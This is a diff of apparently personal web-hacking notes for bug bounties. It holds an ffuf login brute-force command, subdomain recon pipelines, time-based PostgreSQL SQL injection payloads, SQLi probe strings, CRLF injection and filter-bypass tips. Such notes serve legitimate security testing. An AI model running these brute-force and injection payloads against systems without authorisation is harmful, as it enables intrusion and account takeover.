@@ -3,24 +3,22 @@
 
 - Test things under different environments, browsers.
 - Make a flow diagram of deciding to opt-in or out of features.
-- Test every input, make sure to disregard any client-side restrictions.
-- When one directory isn't accessible, try its subdirectories.
-- In python `requests` there is url-encoding is done automatically.
-- Look into the URI spec `https://www.ietf.org/rfc/rfc3986.txt`.
-- If certain characters are blocked, use illegal unicode chars in Burp Intruder.
-- For faster HTTP requests and multithreading use `Turbo Intruder`.
 - Sometimes, `Wappalyzer` may detect extra information in view-source.
-- Be aware of encodings. For example, browsers automatically URL-encode certain things.
+- Test every input, make sure to disregard any client-side restrictions.
+- Remember the source and DOM are different. Keep an eye out for the devtools.
+- If certain characters are blocked, use illegal unicode chars in Burp Intruder.
+- Be aware of double encodings, browsers automatically URL-encode certain things.
 - The server might be Windows. Don't forget, in case of webshells, you might need different commands. 
 - For a newline, somtimes you need CRLF, individual CR or LF might not work, therefore use: `%0d%0a` (webhacking.kr - 38).
+- Just because request fails with one method doesn't mean it will fail with a different method. Try `PUT` instead of `GET`.
+
 
 ### Recon
-- Recon is a continuous process, keep scanning and diffing for subdomains.
+- Recon is a continuous process, keep scanning and diffing for subdomains (using git).
 - Don't forget to look into the sources, interesting things might not always be inline.
 - If you have multiple files containing subdomains, merge them using: `$ cat file1.txt file2.txt | sort | uniq > out`
 - If you have a subdomain, look for further subdomains for it.
-
-#### recon.sh
+- When one directory isn't accessible, try its subdirectories.
 
 #### Wordlists
 - FuzzDB
@@ -58,6 +56,8 @@ $ amass enum -list
 
 #### ffuf
 ```
+# -e    Comma separated list of extensions. Extends FUZZ keyword.
+
 $ ffuf -w ~/wordlists/common.txt -u https://example.com/FUZZ
 $ ffuf -w ~/wordlists/10-million-password-list-top-100.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u https://www.example.com/login -mc all -fc 200
 $ ffuf -w ~/wordlists/common.txt -b "cookie1=value1;cookie2=value2" -H "X-Header: ASDF" -u https://example.com/dir/FUZZ
@@ -108,8 +108,10 @@ $ python3 arjun.py -u http://example.domain.com/endpoint --get
 `https://github.com/wagiro/BurpBounty`
 
 ### Bugs
-#### postMessage
+#### CRLF Injection / HTTP Response Splitting
+- Send a requests such that the response reflects into the headers and inject a CRLF.
 
+#### postMessage
 - https://twitter.com/s0md3v/status/1256511604046340096
 - https://twitter.com/xdavidhu/status/1262317923311509505
 
@@ -148,6 +150,7 @@ $ subfinder -d http://hackerone.com -silent | dnsprobe -silent -f domain | httpr
 - For postgres time-based, `||pg_sleep(10)`
 - For postgres time-based conditions `'; SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END--`
 - To test for SQL injection (can be put in burp intruder): [source](https://twitter.com/pwntheweb/status/1253224265853198336)
+
 ```
 /?q=1
 /?q=1'
@@ -158,11 +161,16 @@ $ subfinder -d http://hackerone.com -silent | dnsprobe -silent -f domain | httpr
 /?q=1\
 /?q=1/*'*/
 /?q=1/*!1111'*/
-/?q=1'||'asd'||'   <== concat string
+/?q=1'||'asd'||'
 /?q=1' or '1'='1
 /?q=1 or 1=1
 /?q='or''='
 ```
+
+SQLmap
+- If SQLmap stops in between, try pressing `Enter`.
+- Always use `--threads 10` with SQLmap.
+- Output goes to `~/.sqlmap/output/`
 
 #### PHP
 
